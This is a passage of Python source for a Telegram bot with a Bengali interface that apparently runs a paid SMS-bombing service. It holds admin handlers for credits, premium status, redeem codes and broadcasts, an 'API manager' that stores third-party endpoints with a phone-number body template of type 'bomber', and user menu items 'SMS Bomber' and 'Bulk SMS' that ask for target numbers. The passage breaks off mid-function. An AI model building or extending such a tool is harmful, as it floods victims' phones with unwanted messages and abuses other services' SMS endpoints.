                    f"ℹ️ **ইউজার তথ্য**\n━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🆔 আইডি: `{target_id}`\n"
                    f"👤 নাম: {row[1] or 'N/A'}\n"
                    f"📛 ইউজারনেম: @{row[0] or 'N/A'}\n"
                    f"💰 ব্যালেন্স: `{row[2]}`\n"
                    f"📨 এসএমএস: `{row[5]}`\n"
                    f"💣 বোম্বার: `{row[6]}`\n"
                    f"📤 বাল্ক: `{row[7]}`\n"
                    f"👑 প্রিমিয়াম: {'✅' if is_prem else '❌'}\n"
                    f"🚦 স্ট্যাটাস: {row[3]}\n"
                    f"📅 যোগদান: {row[8][:10] if row[8] else 'N/A'}",
                    parse_mode="Markdown",
                    reply_markup=get_user_control_keyboard()
                )
            else:
                await update.message.reply_text("❌ ইউজার পাওয়া যায়নি!", reply_markup=get_user_control_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'make_premium':
        try:
            target_id = int(message.strip())
            expiry = (datetime.now() + timedelta(days=30)).isoformat()
            conn = await get_db()
            await conn.execute("UPDATE users SET is_premium = 1, premium_expiry = ? WHERE user_id = ?", (expiry, target_id))
            await conn.commit()
            await admin_log(user_id, "Made Premium", target_id, f"User {target_id} made premium")
            await update.message.reply_text(f"👑 ইউজার `{target_id}` প্রিমিয়াম!", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'remove_premium':
        try:
            target_id = int(message.strip())
            conn = await get_db()
            await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (target_id,))
            await conn.commit()
            await admin_log(user_id, "Removed Premium", target_id, f"Premium removed from user {target_id}")
            await update.message.reply_text(f"❌ ইউজার `{target_id}` থেকে প্রিমিয়াম রিমুভ!", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'delete_user':
        try:
            target_id = int(message.strip())
            conn = await get_db()
            await conn.execute("DELETE FROM users WHERE user_id = ?", (target_id,))
            await conn.commit()
            await admin_log(user_id, "Deleted User", target_id, f"User {target_id} deleted")
            await update.message.reply_text(f"🗑️ ইউজার `{target_id}` ডিলিট!", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    # ============================================================
    # 📢 গ্রুপ কন্ট্রোল
    # ============================================================
    if message == "📢 Set Channel":
        await update.message.reply_text("📢 **Set Channel**\n\nচ্যানেল ইউজারনেম দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'set_channel'
        return
    if message == "👥 Set Group":
        await update.message.reply_text("👥 **Set Group**\n\nগ্রুপ ইউজারনেম দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'set_group'
        return
    if message == "🔗 Set Channel Link":
        await update.message.reply_text("🔗 **Set Channel Link**\n\nচ্যানেল লিংক দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'set_channel_link'
        return
    if message == "🔗 Set Group Link":
        await update.message.reply_text("🔗 **Set Group Link**\n\nগ্রুপ লিংক দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'set_group_link'
        return
    if message == "✏️ Set Welcome":
        await update.message.reply_text("✏️ **Set Welcome**\n\nনতুন ওয়েলকাম মেসেজ দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'set_welcome'
        return
    if message == "🚫 Set Denied":
        await update.message.reply_text("🚫 **Set Denied**\n\nডিনাই মেসেজ দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'set_denied'
        return
    if message == "✅ Enable Join":
        await update_setting("join_required_enabled", "true")
        await admin_log(user_id, "Enabled Join Required", None, "Join required enabled")
        await update.message.reply_text("✅ **জয়েন রিকোয়ার্ড চালু!**", parse_mode="Markdown", reply_markup=get_group_control_keyboard())
        return
    if message == "❌ Disable Join":
        await update_setting("join_required_enabled", "false")
        await admin_log(user_id, "Disabled Join Required", None, "Join required disabled")
        await update.message.reply_text("❌ **জয়েন রিকোয়ার্ড বন্ধ!**", parse_mode="Markdown", reply_markup=get_group_control_keyboard())
        return
    if message == "📊 View Settings":
        channel = get_setting('required_channel', 'সেট করা নেই')
        group = get_setting('required_group', 'সেট করা নেই')
        channel_link = get_setting('required_channel_link', 'সেট করা নেই')
        group_link = get_setting('required_group_link', 'সেট করা নেই')
        join_enabled = get_setting('join_required_enabled', 'false')
        await update.message.reply_text(
            f"📊 **সেটিংস**\n━━━━━━━━━━━━━━━━━━━\n\n"
            f"📢 চ্যানেল: `{channel}`\n"
            f"👥 গ্রুপ: `{group}`\n"
            f"🔗 চ্যানেল লিংক: `{channel_link}`\n"
            f"🔗 গ্রুপ লিংক: `{group_link}`\n"
            f"✅ জয়েন রিকোয়ার্ড: {'✅ চালু' if join_enabled == 'true' else '❌ বন্ধ'}",
            parse_mode="Markdown",
            reply_markup=get_group_control_keyboard()
        )
        return
    
    # ============================================================
    # 📢 গ্রুপ কন্ট্রোল এক্সিকিউট
    # ============================================================
    if admin_state == 'set_channel':
        channel = message.strip()
        if not channel.startswith('@'):
            channel = '@' + channel
        await update_setting("required_channel", channel)
        await admin_log(user_id, "Set Channel", None, f"Channel set to {channel}")
        await update.message.reply_text(f"✅ চ্যানেল সেট: {channel}", reply_markup=get_group_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'set_group':
        group = message.strip()
        if not group.startswith('@'):
            group = '@' + group
        await update_setting("required_group", group)
        await admin_log(user_id, "Set Group", None, f"Group set to {group}")
        await update.message.reply_text(f"✅ গ্রুপ সেট: {group}", reply_markup=get_group_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'set_channel_link':
        await update_setting("required_channel_link", message.strip())
        await admin_log(user_id, "Set Channel Link", None, f"Channel link set")
        await update.message.reply_text(f"✅ চ্যানেল লিংক সেট!", reply_markup=get_group_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'set_group_link':
        await update_setting("required_group_link", message.strip())
        await admin_log(user_id, "Set Group Link", None, f"Group link set")
        await update.message.reply_text(f"✅ গ্রুপ লিংক সেট!", reply_markup=get_group_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'set_welcome':
        await update_setting("welcome_message", message.strip())
        await admin_log(user_id, "Set Welcome Message", None, f"Welcome message updated")
        await update.message.reply_text(f"✅ ওয়েলকাম মেসেজ সেট!", reply_markup=get_group_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'set_denied':
        await update_setting("denied_message", message.strip())
        await admin_log(user_id, "Set Denied Message", None, f"Denied message updated")
        await update.message.reply_text(f"✅ ডিনাই মেসেজ সেট!", reply_markup=get_group_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    # ============================================================
    # 💰 ব্যালেন্স কন্ট্রোল
    # ============================================================
    if message == "🟢 Add Credit":
        await update.message.reply_text("🟢 **Add Credit**\n\nFormat: `USER_ID AMOUNT`", parse_mode="Markdown")
        context.user_data['admin_state'] = 'add_credit'
        return
    if message == "🔴 Remove Credit":
        await update.message.reply_text("🔴 **Remove Credit**\n\nFormat: `USER_ID AMOUNT`", parse_mode="Markdown")
        context.user_data['admin_state'] = 'remove_credit'
        return
    if message == "🎁 Gift All":
        await update.message.reply_text("🎁 **Gift All**\n\nপরিমাণ দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'gift_all'
        return
    if message == "🎁 Gift User":
        await update.message.reply_text("🎁 **Gift User**\n\nFormat: `USER_ID AMOUNT`", parse_mode="Markdown")
        context.user_data['admin_state'] = 'gift_user'
        return
    if message == "📝 Set Balance":
        await update.message.reply_text("📝 **Set Balance**\n\nFormat: `USER_ID AMOUNT`", parse_mode="Markdown")
        context.user_data['admin_state'] = 'set_balance'
        return
    if message == "🔄 Reset All":
        await update.message.reply_text("🔄 **Reset All**\n\nসব ইউজারের ব্যালেন্স ০ করতে চান? (হ্যাঁ/না)", parse_mode="Markdown")
        context.user_data['admin_state'] = 'reset_all'
        return
    if message == "📊 Report":
        conn = await get_db()
        cursor = await conn.execute("SELECT SUM(balance), AVG(balance), MAX(balance), COUNT(*) FROM users")
        stats = await cursor.fetchone()
        await update.message.reply_text(
            f"📊 **ব্যালেন্স রিপোর্ট**\n━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 মোট ইউজার: `{stats[3]}`\n"
            f"💰 মোট ব্যালেন্স: `{stats[0] or 0}`\n"
            f"📊 গড়: `{round(stats[1] or 0, 2)}`\n"
            f"📈 সর্বোচ্চ: `{stats[2]}`",
            parse_mode="Markdown",
            reply_markup=get_balance_keyboard()
        )
        return
    
    # ============================================================
    # 💰 ব্যালেন্স কন্ট্রোল এক্সিকিউট
    # ============================================================
    if admin_state == 'add_credit':
        try:
            parts = message.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
                return
            target_id, amount = int(parts[0]), int(parts[1])
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
            await conn.commit()
            await track_transaction(target_id, "add", amount, "Admin added")
            await admin_log(user_id, "Added Credit", target_id, f"Added {amount} credits")
            await update.message.reply_text(f"✅ ইউজার `{target_id}` কে `{amount}` ক্রেডিট যোগ!", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'remove_credit':
        try:
            parts = message.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
                return
            target_id, amount = int(parts[0]), int(parts[1])
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target_id))
            await conn.commit()
            await track_transaction(target_id, "remove", -amount, "Admin removed")
            await admin_log(user_id, "Removed Credit", target_id, f"Removed {amount} credits")
            await update.message.reply_text(f"✅ ইউজার `{target_id}` থেকে `{amount}` ক্রেডিট কাটা!", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'gift_all':
        try:
            amount = int(message.strip())
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = balance + ?", (amount,))
            await conn.commit()
            cursor = await conn.execute("SELECT COUNT(*) FROM users")
            count = await cursor.fetchone()
            await admin_log(user_id, "Gifted All", None, f"Gifted {amount} credits to all users")
            await update.message.reply_text(f"🎁 {count[0]} জন ইউজারকে `{amount}` ক্রেডিট উপহার!", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        except:
            await update.message.reply_text("❌ ভুল অ্যামাউন্ট! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'gift_user':
        try:
            parts = message.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
                return
            target_id, amount = int(parts[0]), int(parts[1])
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
            await conn.commit()
            await track_transaction(target_id, "gift", amount, "Admin gifted")
            await admin_log(user_id, "Gifted User", target_id, f"Gifted {amount} credits")
            await update.message.reply_text(f"🎁 ইউজার `{target_id}` কে `{amount}` ক্রেডিট উপহার!", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'set_balance':
        try:
            parts = message.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
                return
            target_id, amount = int(parts[0]), int(parts[1])
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = ? WHERE user_id = ?", (amount, target_id))
            await conn.commit()
            await admin_log(user_id, "Set Balance", target_id, f"Set balance to {amount}")
            await update.message.reply_text(f"✅ ইউজার `{target_id}` এর ব্যালেন্স `{amount}` সেট!", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! Format: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_balance_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'reset_all':
        if message.lower() in ['হ্যাঁ', 'yes', 'y']:
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = 0")
            await conn.commit()
            await admin_log(user_id, "Reset All Balance", None, "All balances reset to 0")
            await update.message.reply_text("🔄 সব ইউজারের ব্যালেন্স ০ করা হয়েছে!", reply_markup=get_balance_keyboard())
        else:
            await update.message.reply_text("❌ বাতিল!", reply_markup=get_balance_keyboard())
        context.user_data['admin_state'] = None
        return
    
    # ============================================================
    # 🎟️ রিডিম কন্ট্রোল
    # ============================================================
    if message == "➕ Create Code":
        await update.message.reply_text("➕ **Create Code**\n\nFormat: `CODE AMOUNT USAGES`\nExample: `BONUS25 25 50`", parse_mode="Markdown")
        context.user_data['admin_state'] = 'create_code'
        return
    if message == "❌ Delete Code":
        await update.message.reply_text("❌ **Delete Code**\n\nকোড দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'delete_code'
        return
    if message == "🗑️ Delete All":
        conn = await get_db()
        await conn.execute("DELETE FROM redeem_codes")
        await conn.commit()
        await admin_log(user_id, "Deleted All Codes", None, "All redeem codes deleted")
        await update.message.reply_text("🗑️ **সব কোড ডিলিট!**", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        return
    if message == "✏️ Edit Code":
        await update.message.reply_text("✏️ **Edit Code**\n\nFormat: `CODE NEW_AMOUNT NEW_USAGES`", parse_mode="Markdown")
        context.user_data['admin_state'] = 'edit_code'
        return
    if message == "📋 List Codes":
        conn = await get_db()
        cursor = await conn.execute("SELECT code, amount, usages FROM redeem_codes ORDER BY created_at DESC")
        codes = await cursor.fetchall()
        if codes:
            response = "🎟️ **সব কোড**\n━━━━━━━━━━━━━━━━━━━\n\n"
            for code in codes:
                status = "✅" if code[2] > 0 else "❌"
                response += f"{status} `{code[0]}` → 💰{code[1]} (বাকি: {code[2]})\n"
            await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        else:
            await update.message.reply_text("📭 কোনো কোড নেই!", reply_markup=get_redeem_keyboard())
        return
    
    # ============================================================
    # 🎟️ রিডিম কন্ট্রোল এক্সিকিউট
    # ============================================================
    if admin_state == 'create_code':
        try:
            parts = message.split()
            if len(parts) != 3:
                await update.message.reply_text("❌ Format: `CODE AMOUNT USAGES`", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
                return
            code, amount, usages = parts[0].upper(), int(parts[1]), int(parts[2])
            conn = await get_db()
            await conn.execute(
                "INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?, ?, ?, ?)",
                (code, amount, usages, user_id)
            )
            await conn.commit()
            await admin_log(user_id, "Created Code", None, f"Created code {code} with {amount}x{usages}")
            await update.message.reply_text(f"✅ কোড `{code}` তৈরি! (💰{amount})", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! Format: `CODE AMOUNT USAGES`", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'delete_code':
        try:
            code = message.strip().upper()
            conn = await get_db()
            await conn.execute("DELETE FROM redeem_codes WHERE code = ?", (code,))
            await conn.commit()
            await admin_log(user_id, "Deleted Code", None, f"Deleted code {code}")
            await update.message.reply_text(f"🗑️ কোড `{code}` ডিলিট!", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! সঠিক কোড দিন।", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'edit_code':
        try:
            parts = message.split()
            if len(parts) != 3:
                await update.message.reply_text("❌ Format: `CODE NEW_AMOUNT NEW_USAGES`", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
                return
            code, amount, usages = parts[0].upper(), int(parts[1]), int(parts[2])
            conn = await get_db()
            await conn.execute("UPDATE redeem_codes SET amount = ?, usages = ? WHERE code = ?", (amount, usages, code))
            await conn.commit()
            await admin_log(user_id, "Edited Code", None, f"Edited code {code} to {amount}x{usages}")
            await update.message.reply_text(f"✅ কোড `{code}` আপডেট!", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! Format: `CODE NEW_AMOUNT NEW_USAGES`", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
        context.user_data['admin_state'] = None
        return
    
    # ============================================================
    # 📡 API ম্যানেজার
    # ============================================================
    if message == "➕ Add API":
        await update.message.reply_text(
            "➕ **Add API**\n\nFormat: `NAME|METHOD|URL|BODY|TYPE`\nExample: `MyAPI|POST|https://api.com|{\"phone\":\"{phone}\"}|bomber`",
            parse_mode="Markdown"
        )
        context.user_data['admin_state'] = 'add_api'
        return
    if message == "✏️ Edit API":
        conn = await get_db()
        cursor = await conn.execute("SELECT id, name, api_type FROM apis")
        apis = await cursor.fetchall()
        if apis:
            response = "✏️ **Edit API**\n\nAPI আইডি দিন:\n\n"
            for api in apis:
                response += f"`{api[0]}` → {api[1]} ({api[2]})\n"
            await update.message.reply_text(response, parse_mode="Markdown")
            context.user_data['admin_state'] = 'edit_api'
        else:
            await update.message.reply_text("📭 কোনো API নেই!", reply_markup=get_api_keyboard())
        return
    if message == "🗑️ Delete API":
        conn = await get_db()
        cursor = await conn.execute("SELECT id, name FROM apis")
        apis = await cursor.fetchall()
        if apis:
            response = "🗑️ **Delete API**\n\nAPI আইডি দিন:\n\n"
            for api in apis:
                response += f"`{api[0]}` → {api[1]}\n"
            await update.message.reply_text(response, parse_mode="Markdown")
            context.user_data['admin_state'] = 'delete_api'
        else:
            await update.message.reply_text("📭 কোনো API নেই!", reply_markup=get_api_keyboard())
        return
    if message == "🔄 Toggle API":
        conn = await get_db()
        cursor = await conn.execute("SELECT id, name, is_active FROM apis")
        apis = await cursor.fetchall()
        if apis:
            response = "🔄 **Toggle API**\n\nAPI আইডি দিন:\n\n"
            for api in apis:
                status = "🟢" if api[2] else "🔴"
                response += f"{status} `{api[0]}` → {api[1]}\n"
            await update.message.reply_text(response, parse_mode="Markdown")
            context.user_data['admin_state'] = 'toggle_api'
        else:
            await update.message.reply_text("📭 কোনো API নেই!", reply_markup=get_api_keyboard())
        return
    if message == "📋 View APIs":
        conn = await get_db()
        cursor = await conn.execute("SELECT id, name, method, url, is_active, api_type FROM apis")
        apis = await cursor.fetchall()
        if apis:
            response = "📋 **সব API**\n━━━━━━━━━━━━━━━━━━━\n\n"
            for api in apis:
                status = "🟢 Active" if api[4] else "🔴 Inactive"
                response += f"`{api[0]}` → {api[1]} ({api[5]})\n"
                response += f"   📝 {api[2]}\n"
                response += f"   🚦 {status}\n\n"
            await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_api_keyboard())
        else:
            await update.message.reply_text("📭 কোনো API নেই!", reply_markup=get_api_keyboard())
        return
    
    # ============================================================
    # 📡 API ম্যানেজার এক্সিকিউট
    # ============================================================
    if admin_state == 'add_api':
        try:
            parts = message.split('|')
            if len(parts) != 5:
                await update.message.reply_text("❌ Format: `NAME|METHOD|URL|BODY|TYPE`", parse_mode="Markdown", reply_markup=get_api_keyboard())
                return
            name, method, url, body, api_type = parts[0].strip(), parts[1].strip().upper(), parts[2].strip(), parts[3].strip(), parts[4].strip().lower()
            json.loads(body)
            conn = await get_db()
            await conn.execute(
                "INSERT INTO apis (name, method, url, body, api_type) VALUES (?, ?, ?, ?, ?)",
                (name, method, url, body, api_type)
            )
            await conn.commit()
            await load_apis()
            await admin_log(user_id, "Added API", None, f"Added API {name} ({api_type})")
            await update.message.reply_text(f"✅ API `{name}` যোগ! ({api_type})", parse_mode="Markdown", reply_markup=get_api_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! JSON চেক করুন।", parse_mode="Markdown", reply_markup=get_api_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'edit_api':
        try:
            api_id = int(message.strip())
            conn = await get_db()
            cursor = await conn.execute("SELECT name, method, url, body, api_type FROM apis WHERE id = ?", (api_id,))
            row = await cursor.fetchone()
            if row:
                context.user_data['edit_api_id'] = api_id
                context.user_data['admin_state'] = 'edit_api_data'
                await update.message.reply_text(
                    f"✏️ **Edit API**\n\nবর্তমান: {row[0]} | {row[1]} | {row[2]} | {row[3]} | {row[4]}\n\nনতুন ডেটা দিন: `NAME|METHOD|URL|BODY|TYPE`",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ API পাওয়া যায়নি!", reply_markup=get_api_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_api_keyboard())
        return
    
    if admin_state == 'edit_api_data':
        try:
            api_id = context.user_data.get('edit_api_id')
            parts = message.split('|')
            if len(parts) != 5:
                await update.message.reply_text("❌ Format: `NAME|METHOD|URL|BODY|TYPE`", parse_mode="Markdown", reply_markup=get_api_keyboard())
                return
            name, method, url, body, api_type = parts[0].strip(), parts[1].strip().upper(), parts[2].strip(), parts[3].strip(), parts[4].strip().lower()
            json.loads(body)
            conn = await get_db()
            await conn.execute(
                "UPDATE apis SET name = ?, method = ?, url = ?, body = ?, api_type = ? WHERE id = ?",
                (name, method, url, body, api_type, api_id)
            )
            await conn.commit()
            await load_apis()
            await admin_log(user_id, "Edited API", None, f"Edited API {name}")
            await update.message.reply_text(f"✅ API `{name}` আপডেট!", parse_mode="Markdown", reply_markup=get_api_keyboard())
        except:
            await update.message.reply_text("❌ ত্রুটি! Format: `NAME|METHOD|URL|BODY|TYPE`", parse_mode="Markdown", reply_markup=get_api_keyboard())
        context.user_data['admin_state'] = None
        context.user_data.pop('edit_api_id', None)
        return
    
    if admin_state == 'delete_api':
        try:
            api_id = int(message.strip())
            conn = await get_db()
            await conn.execute("DELETE FROM apis WHERE id = ?", (api_id,))
            await conn.commit()
            await load_apis()
            await admin_log(user_id, "Deleted API", None, f"Deleted API ID {api_id}")
            await update.message.reply_text(f"🗑️ API ID `{api_id}` ডিলিট!", parse_mode="Markdown", reply_markup=get_api_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_api_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'toggle_api':
        try:
            api_id = int(message.strip())
            conn = await get_db()
            cursor = await conn.execute("SELECT is_active FROM apis WHERE id = ?", (api_id,))
            row = await cursor.fetchone()
            if row:
                new_status = 0 if row[0] else 1
                await conn.execute("UPDATE apis SET is_active = ? WHERE id = ?", (new_status, api_id))
                await conn.commit()
                await load_apis()
                await admin_log(user_id, "Toggled API", None, f"Toggled API ID {api_id} to {'Active' if new_status else 'Inactive'}")
                await update.message.reply_text(f"🔄 API টগল!", parse_mode="Markdown", reply_markup=get_api_keyboard())
            else:
                await update.message.reply_text("❌ API পাওয়া যায়নি!", reply_markup=get_api_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_api_keyboard())
        context.user_data['admin_state'] = None
        return
    
    # ============================================================
    # 🎁 বোনাস কন্ট্রোল
    # ============================================================
    if admin_state == 'bonus_control':
        parts = message.split()
        cmd = parts[0].upper() if parts else ""
        if cmd == 'DAILY' and len(parts) >= 2:
            if parts[1].upper() == 'ON':
                await update_setting("daily_bonus_enabled", "true")
                await admin_log(user_id, "Enabled Daily Bonus", None, "Daily bonus enabled")
                await update.message.reply_text("✅ ডেইলি বোনাস চালু!", reply_markup=get_admin_keyboard())
            elif parts[1].upper() == 'OFF':
                await update_setting("daily_bonus_enabled", "false")
                await admin_log(user_id, "Disabled Daily Bonus", None, "Daily bonus disabled")
                await update.message.reply_text("❌ ডেইলি বোনাস বন্ধ!", reply_markup=get_admin_keyboard())
            elif parts[1].upper() == 'AMOUNT' and len(parts) >= 3:
                await update_setting("daily_bonus_amount", parts[2])
                await admin_log(user_id, "Set Daily Bonus Amount", None, f"Daily bonus amount set to {parts[2]}")
                await update.message.reply_text(f"💰 ডেইলি বোনাস `{parts[2]}` সেট!", parse_mode="Markdown", reply_markup=get_admin_keyboard())
            elif parts[1].upper() == 'COOLDOWN' and len(parts) >= 3:
                await update_setting("daily_bonus_cooldown", parts[2])
                await admin_log(user_id, "Set Daily Bonus Cooldown", None, f"Daily bonus cooldown set to {parts[2]}")
                await update.message.reply_text(f"⏰ কুলডাউন `{parts[2]}` ঘণ্টা সেট!", parse_mode="Markdown", reply_markup=get_admin_keyboard())
            else:
                await update.message.reply_text("❌ ভুল কমান্ড!", parse_mode="Markdown", reply_markup=get_admin_keyboard())
        else:
            await update.message.reply_text(
                "❌ **ভুল কমান্ড!**\n\n"
                "`DAILY ON` - চালু\n"
                "`DAILY OFF` - বন্ধ\n"
                "`DAILY AMOUNT 10` - বোনাস পরিবর্তন\n"
                "`DAILY COOLDOWN 12` - কুলডাউন",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        context.user_data['admin_state'] = None
        return
    
    # ============================================================
    # 📣 ব্রডকাস্ট
    # ============================================================
    if admin_state == 'broadcast':
        conn = await get_db()
        cursor = await conn.execute("SELECT user_id FROM users WHERE status = 'active'")
        users = await cursor.fetchall()
        success = 0
        for user in users:
            try:
                await context.bot.send_message(user[0], f"📢 **ব্রডকাস্ট**\n\n{message}", parse_mode='Markdown')
                success += 1
                await asyncio.sleep(0.02)
            except:
                pass
        await admin_log(user_id, "Broadcast", None, f"Broadcast sent to {success} users")
        await update.message.reply_text(f"✅ {success} জনে ব্রডকাস্ট সম্পূর্ণ!", reply_markup=get_admin_keyboard())
        context.user_data['admin_state'] = None
        return
    
    # ============================================================
    # 👤 ইউজার মেনু
    # ============================================================
    if message == "📨 Send SMS":
        await update.message.reply_text("📨 **Send SMS**\n\nফোন নম্বর দিন:", parse_mode="Markdown")
        context.user_data['state'] = 'sms_number'
        return
    
    if message == "💣 SMS Bomber":
        await update.message.reply_text("💣 **SMS Bomber**\n\nটার্গেট নম্বর দিন:", parse_mode="Markdown")
        context.user_data['state'] = 'bomber_number'
        return
    
    if message == "📤 Bulk SMS":
        await update.message.reply_text("📤 **Bulk SMS**\n\nনম্বরগুলো দিন (কমা বা স্পেস দিয়ে):", parse_mode="Markdown")
        context.user_data['state'] = 'bulk_numbers'
        return
    
    if message == "👤 My Profile":
        conn = await get_db()
        cursor = await conn.execute(
            "SELECT username, first_name, balance, total_sms, total_bombing, total_bulk, is_premium, premium_expiry, join_date FROM users WHERE user_id = ?",
            (user_id,)
        )
        row = await cursor.fetchone()
        if row:
            is_prem = row[6] == 1 and not is_premium_expired(row[7])
            msg = f"👤 **প্রোফাইল**\n━━━━━━━━━━━━━━━━━━━\n\n"
            msg += f"👤 নাম: {row[1] or 'N/A'}\n"
            msg += f"📛 ইউজারনেম: @{row[0] or 'N/A'}\n"
            msg += f"💰 ব্যালেন্স: `{row[2]}`\n"
            msg += f"📨 এসএমএস: `{row[3]}`\n"
            msg += f"💣 বোম্বার: `{row[4]}`\n"
            msg += f"📤 বাল্ক: `{row[5]}`\n"
            msg += f"👑 প্রিমিয়াম: {'✅' if is_prem else '❌'}\n"
            msg += f"📅 যোগদান: {row[8][:10] if row[8] else 'N/A'}\n\n"
            msg += f"📌 রেফারেল কোড: `{generate_referral_code(user_id)}`"
            await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("❌ প্রোফাইল পাওয়া যায়নি!", parse_mode="Markdown")
        return
    
    if message == "🎁 Redeem Code":
        await update.message.reply_text("🎁 **রিডিম কোড দিন:**", parse_mode="Markdown")
        context.user_data['state'] = 'redeem_code'
        return
    
    if message == "📞 Support":
        keyboard = [
            [InlineKeyboardButton("📩 অ্যাডমিন", url=f"https://t.me/{ADMIN_USERNAME}")],
            [InlineKeyboardButton("📢 চ্যানেল", url="https://t.me/RobiEntertainment")]
        ]
        await update.message.reply_text(
            f"📞 **যোগাযোগ**\n\n👨‍💻 অ্যাডমিন: @{ADMIN_USERNAME}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    if message == "⭐ Daily Bonus":
        if get_setting('daily_bonus_enabled', 'false') != 'true':
            await update.message.reply_text("❌ ডেইলি বোনাস বন্ধ!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            return
        conn = await get_db()
        cursor = await conn.execute("SELECT daily_bonus_date, is_premium, premium_expiry FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if row:
